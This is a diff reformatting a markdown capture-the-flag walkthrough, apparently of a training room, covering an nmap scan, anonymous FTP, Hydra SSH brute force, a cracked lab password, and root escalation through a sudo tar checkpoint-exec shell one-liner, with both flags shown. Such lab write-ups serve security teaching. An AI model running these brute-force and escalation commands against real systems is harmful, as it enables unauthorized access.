@@ -25,97 +25,142 @@ You'll enumerate a server, access files via FTP, crack credentials, and escalate
 
 ```bash
 nmap -sC -sV <target-ip>
+```
 
-Ports Discovered:
+**Ports Discovered:**
 
-    21/tcp – FTP (vsftpd 3.0.3, anonymous login allowed)
+- `21/tcp` – FTP (vsftpd 3.0.3, anonymous login allowed)  
+- `22/tcp` – SSH (OpenSSH 7.2.2)  
+- `80/tcp` – HTTP (Apache httpd 2.4.18)
 
-    22/tcp – SSH (OpenSSH 7.2.2)
+---
 
-    80/tcp – HTTP (Apache httpd 2.4.18)
+## 📂 FTP Access
 
-📂 FTP Access
-
+```bash
 ftp <target-ip>
 Name: anonymous
+```
 
-📁 Files Discovered
+### 📁 Files Discovered
 
+```bash
 ftp> ls
 locks.txt
 task.txt
 
 ftp> get locks.txt
 ftp> get task.txt
+```
 
-📄 task.txt
+#### 📄 task.txt
 
+```
 1.) Protect Vicious.  
 2.) Plan for Red Eye pickup on the moon.  
 -lin
+```
 
-🔑 Username hint: lin
-📄 locks.txt
+🔑 **Username hint:** `lin`
+
+#### 📄 locks.txt
 
 Custom password list found — likely reused credentials.
-🔓 Gaining Access
-🚀 Brute Force with Hydra
 
+---
+
+## 🔓 Gaining Access
+
+### 🚀 Brute Force with Hydra
+
+```bash
 hydra -l lin -P locks.txt ssh://<target-ip>
+```
 
-✅ Password Found: RedDr4gonSynd1cat3
-🔐 SSH Access
+✅ **Password Found:** `RedDr4gonSynd1cat3`
 
+---
+
+## 🔐 SSH Access
+
+```bash
 ssh lin@<target-ip>
+```
 
-🏁 User Flag
+---
 
+## 🏁 User Flag
+
+```bash
 cat ~/Desktop/user.txt
+```
 
-Flag:
-
+**Flag:**  
+```
 THM{CR1M3_SyNd1C4T3}
+```
 
-🪜 Privilege Escalation
-🔍 Sudo Permissions
+---
 
+## 🪜 Privilege Escalation
+
+### 🔍 Sudo Permissions
+
+```bash
 sudo -l
+```
 
+```text
 User lin may run the following command as root:
 (root) /bin/tar
+```
 
-📦 Exploit Using tar
+### 📦 Exploiting tar
 
+```bash
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
 
+```bash
 whoami
 root
+```
 
-👑 Root Flag
+---
 
+## 👑 Root Flag
+
+```bash
 cat /root/root.txt
+```
 
-Flag:
-
+**Flag:**  
+```
 THM{80UN7Y_h4cK3r}
+```
 
-💡 Reflections
+---
 
-    📥 Anonymous FTP access is often overlooked but powerful
+## 💡 Reflections
 
-    🔁 Password reuse is still a major weakness
+- Anonymous FTP access is often overlooked but powerful  
+- Password reuse is still a major weakness  
+- Always run `sudo -l` — it's a goldmine  
+- Even basic tools like `tar` can grant root when misconfigured
 
-    🧪 Always run sudo -l — it's a goldmine
+---
 
-    🧰 Even basic tools like tar can grant root when misconfigured
+## 🧠 Pro Tip
 
-🧠 Pro Tip
+> *"When in doubt, poke around, read everything, and always try the simple stuff first."*
 
-    "When in doubt, poke around, read everything, and always try the simple stuff first."
+---
 
-🗂️ Summary of Key Files
-File	Description
-locks.txt	Password list used in brute-force
-task.txt	Initial objective + username clue
-user.txt	First flag found on user's desktop
-root.txt	Root flag retrieved after escalation
+## 📁 Summary of Key Files
+
+| File        | Description                            |
+|-------------|----------------------------------------|
+| `locks.txt` | Password list used in brute-force      |
+| `task.txt`  | Initial objective + username clue      |
+| `user.txt`  | First flag found on user's desktop     |
+| `root.txt`  | Root flag retrieved after escalation   |
